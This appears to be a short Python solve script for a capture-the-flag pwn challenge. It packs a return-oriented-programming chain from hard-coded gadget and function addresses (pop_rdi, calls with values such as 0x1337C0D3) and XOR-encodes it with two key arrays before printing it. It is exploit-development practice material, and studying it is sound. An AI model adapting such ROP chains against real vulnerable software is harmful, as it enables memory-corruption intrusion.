# fmt: off
xs = [0xfd, 0x3c, 0xc4, 0xe, 0x76, 0xff, 0x4b, 0x45, 0x1f, 0x40, 0xf4, 0xe6, 0x80, 0xb8, 0xb5, 0xe8, 0x76, 0x8e, 0x3b, 0xf8, 0xe4, 0xbd, 0xc9, 0xc7, 0x3f, 0xe6, 0xcf, 0x15, 0x94, 0x9a, 0x8a, 0x28, 0x4e, 0x5e, 0x1e, 0x3f, 0x25, 0xd4, 0x2c, 0xa9, 0x36, 0x28, 0x42, 0x40, 0x93, 0x8d, 0xf, 0xff, 0xae, 0x2b, 0x2b, 0xdf, 0x7e, 0x1a, 0x4e, 0x5, 0x63, 0xd0, 0x88, 0xe1, 0xa1, 0x1f, 0x5a, 0x3d, 0x36, 0x4f, 0xae, 0x89, 0x7b, 0xd7, 0x27, 0xd0, 0x29, 0xc0, 0x9e, 0xf0, 0x20, 0xdf, 0x69, 0x77, 0x94, 0xe9, 0x58, 0xf, 0xb8, 0xec, 0xf9, 0x24]
vals = [0x85, 0x4d, 0xf0, 0x68, 0x0d, 0x91, 0x7b, 0x31, 0xcb, 0x38, 0xd5, 0x95, 0xf4, 0xe7, 0xdb, 0x81, 0xc2, 0x26, 0x78, 0xb4, 0x86, 0xc8, 0xbd, 0x98, 0x65, 0x9c, 0xea, 0x4a, 0xfa, 0xf3, 0xed, 0x40, 0x61, 0x13, 0x3c, 0x5a, 0x43, 0xe4, 0x5e, 0xcc, 0x32, 0x4e, 0x75, 0x25, 0xfd, 0xf9, 0x76, 0xa0, 0xb0, 0x09, 0x1e, 0xad, 0x21, 0x72, 0x2f, 0x66, 0x19, 0xa7, 0xba, 0x92, 0xfe, 0x7c, 0x3b, 0x50, 0xd8, 0x04, 0x8f, 0xd6, 0x10, 0xb9, 0x17, 0xb3, 0x8c, 0x53, 0x5d, 0x49, 0x7f, 0xbe, 0x1d, 0x28, 0x6c, 0x82, 0x47, 0x6b, 0x88, 0xdc, 0x8b, 0x59]
# fmt: on
# generate vals using `gcc test.c -o test && ./test 88`


def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def p64(x: int):
    return x.to_bytes(8, byteorder="little")


pop_rdi = 0x40148B
c = 0x401211
o = 0x40122E
r = 0x40125B
e = 0x401278
t = 0x401295
chain = b"".join(
    map(p64, [c, pop_rdi, 0x1337C0D3, o, r, r, e, c, pop_rdi, 0xDEADFACE, t])
)
print(xor(xor(chain, xs), vals))
